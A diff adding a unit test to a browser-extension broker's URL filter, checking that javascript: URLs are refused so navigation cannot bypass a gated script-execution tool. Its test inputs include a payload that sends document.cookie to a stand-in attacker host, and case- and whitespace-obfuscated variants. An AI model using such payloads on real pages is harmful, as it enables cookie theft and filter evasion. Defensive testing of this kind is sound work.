@@ -101,6 +101,27 @@ test('a refused scheme stays refused however many slashes follow it', () => {
   assert.equal(isRestrictedUrl('https://filesystem.example.com/file:/x'), false, 'a scheme inside a path is not a scheme')
 })
 
+test('a javascript: URL is refused by the broker, not left to the browser', () => {
+  // Navigating is WRITE tier and needs no arm. A javascript: URL is arbitrary
+  // script in the page, which is exactly what browser_eval_js is armed for, so a
+  // navigate that carried one would walk around the arm. Chromium refuses these
+  // in extension API navigations today (PrepareURLForNavigation in
+  // chrome/browser/extensions/extension_tab_util.cc), and this system's rule is
+  // that a refusal belongs in the broker rather than resting on the browser.
+  const scriptUrls = [
+    'javascript:alert(document.cookie)',
+    'JavaScript:void(0)',
+    'JAVASCRIPT://%0Aalert(1)',
+    '  javascript:fetch("https://attacker.example/?c="+document.cookie)',
+    'java\tscript:alert(1)',
+  ]
+  for (const url of scriptUrls) {
+    assert.equal(isRestrictedUrl(url), true, `${JSON.stringify(url)} must be refused`)
+    assert.equal(openOrFocusMode(url), null, `${JSON.stringify(url)} must not be opened by openOrFocus either`)
+  }
+  assert.equal(isRestrictedUrl('https://example.com/javascript:alert(1)'), false, 'the word inside a path is not a scheme')
+})
+
 test('an invisible character cannot change what a scheme parses as', () => {
   // The adversarial review of 0.4.0 found this and it is the worst of the three
   // URL defects: the URL parser DELETES ASCII tab, LF and CR from its input
